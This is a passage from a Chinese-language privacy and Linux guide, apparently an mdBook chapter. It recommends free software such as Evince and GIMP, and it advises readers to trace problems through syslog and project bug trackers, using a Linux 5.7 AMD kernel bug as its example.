<p>而自由軟體則是另一個故事了：它們的作者往往自己使用 GNU/Linux 或 *BSD，許多還專門為這些作業系統構建。</p>
<p>例如 <a href="https://wiki.gnome.org/Apps/Evince">Evince</a>, 來自 GNOME 專案的 PDF 閱讀器，雖然功能沒有 Adobe Acrobat “全面”，但能保你輕鬆閱讀和填寫大多數 PDF 文件而不遇到奇怪問題。</p>
<p>另一個例子是 <a href="https://www.gimp.org/">GIMP</a>, 儘管作者不喜歡它被這麼叫，它依然被廣泛稱為“自由的 Photoshop”. 除了智慧性比 Photoshop 差點，它能承擔所有你在 Photoshop 上的任務。</p>
<blockquote>
<p><i class="fas fa-info-circle"></i> <code>privacy.noarch</code> 的首要任務之一就是讓你更快上手各類自由軟體！</p>
</blockquote>
<h2 id="多問問題問好問題"><a class="header" href="#多問問題問好問題">多問問題，問好問題</a></h2>
<p>雖然作為一個 <del>內向的作曲家</del>，但是 noarch 依然想在最後說：<strong>請利用好社群資源。</strong></p>
<p>GNU/Linux 和 *BSD 由數千個元件構成，當你遇到問題時，請弄清楚是哪個元件引發了你的問題；</p>
<p>例如，你的電腦經常在使用過程中突然卡住，請查閱 <code>syslog</code>, 查出到底是某個軟體，桌面環境，還是核心引起的問題。</p>
<p>在你找出出問題的元件之後，請去它們對應的 bug tracker 搜尋；因為如果你的問題確實由一個最近出現的 bug 引起，搜尋引擎沒法及時索引 bug tracker.</p>
<p>例如 noarch 在 Linux 5.7 釋出時遇到了<a href="https://bugzilla.kernel.org/show_bug.cgi?id=207383">一個巨大的 bug</a>, 它影響了所有 Polaris 11 架構的 AMD 顯示卡，包括 noarch 的 RX580 在內，使得 Linux 核心在執行幾分鐘到幾十分鐘不等時 panic.</p>
<p>noarch 在搜尋引擎搜尋無果，自己編譯核心無果，後來才在 Linux kernel bugzilla 找到了這個問題。雖然沒有參與測試，但 noarch 也得到了解決方案：將核心降級。幸運的是，降級到 Linux 5.6 之後，這個問題就消失了。</p>
<p>如果你對問問題有更多的疑惑，可以參考<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提問的智慧</a>，它圍繞 Hacker 社群的傳統，詳細講解了如何問關於軟體的問題。</p>
<hr/>
<p>如果你發現 noarch 在本章漏了哪些重要內容，請別猶豫，<a href="https://t.me/noarchwastaken">問 noarch</a> 或者為 <code>privacy.noarch</code> <a href="https://github.com/noarchwastaken/privacy/pulls">加上你想要的內容</a>。</p>
</main>
<nav aria-label="Page navigation" class="nav-wrapper">
<!-- Mobile navigation buttons -->
<a aria-keyshortcuts="Left" aria-label="Previous chapter" class="mobile-nav-chapters previous" href="../../Tricks-Windows/VHD/VHD.html" rel="prev" title="Previous chapter">
<i class="fa fa-angle-left"></i>
</a>
<a aria-keyshortcuts="Right" aria-label="Next chapter" class="mobile-nav-chapters next" href="../../Extras/flowers-p1/index.html" rel="next" title="Next chapter">
<i class="fa fa-angle-right"></i>
</a>
<div style="clear: both"></div>
</nav>
</div>
</div>
<nav aria-label="Page navigation" class="nav-wide-wrapper">
<a aria-keyshortcuts="Left" aria-label="Previous chapter" class="nav-chapters previous" href="../../Tricks-Windows/VHD/VHD.html" rel="prev" title="Previous chapter">
<i class="fa fa-angle-left"></i>
</a>
<a aria-keyshortcuts="Right" aria-label="Next chapter" class="nav-chapters next" href="../../Extras/flowers-p1/index.html" rel="next" title="Next chapter">
<i class="fa fa-angle-right"></i>
</a>
</nav>
</div>
<script type="text/javascript">
            window.playground_copyable = true;
        </script>
<script charset="utf-8" src="../../clipboard.min.js" type="text/javascript"></script>
<script charset="utf-8" src="../../highlight.js" type="text/javascript"></script>
<script charset="utf-8" src="../../book.js" type="text/javascript"></script>
<!-- Custom JS scripts -->
<script src="../../sidebar.js" type="text/javascript"></script>
</body>
</html>
